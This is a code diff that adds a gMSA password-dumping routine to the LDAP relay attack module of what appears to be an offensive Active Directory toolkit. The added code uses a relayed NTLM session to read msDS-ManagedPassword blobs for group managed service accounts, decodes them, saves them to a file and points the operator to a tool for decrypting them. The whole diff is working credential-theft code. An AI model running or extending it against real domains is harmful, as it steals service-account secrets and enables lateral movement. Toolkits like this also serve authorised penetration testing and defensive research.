@@ -630,6 +630,42 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
                     fd.close()
 
+        #Dump gMSA Passwords
+        if self.config.dumpgmsa:
+            LOG.info("Attempting to dump MSA passwords")
+            success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+            if success:
+                fd = None
+                filename = "msa-dump-" + self.username + "-" + str(random.randint(0, 99999))
+                count = 0
+                for entry in self.client.response:
+                    try:
+                        dn = "gMSA SAM: " + entry['attributes']['sAMAccountName']
+                        text = binascii.hexlify(entry['attributes']['msDS-ManagedPassword']).decode('utf-8')
+                        hexBytes = [text[i:i+2] for i in range(0, len(text), 2)]
+                        decBytes = ""
+                        for i in xrange(len(hexBytes)):
+                            decBytes += str(int(hexBytes[i],16))
+                            decBytes += ","
+                        passwd = "Password blob: " + decBytes[:-1]
+                        if fd is None:
+                            fd = open(filename, "a+")
+                        count += 1
+                        LOG.debug(dn)
+                        LOG.debug(passwd)
+                        fd.write(dn)
+                        fd.write("\n")
+                        fd.write(passwd)
+                        fd.write("\n")
+                    except:
+                        continue
+                if fd is None:
+                    LOG.info("The relayed user %s does not have permissions to read any MSA passwords" % self.username)
+                else:
+                    LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
+                    LOG.info("Decrypt the password with DSInternals 'ConvertFrom-ADManagedPasswordBlob <blob>'")
+                    fd.close()
+
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
             self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
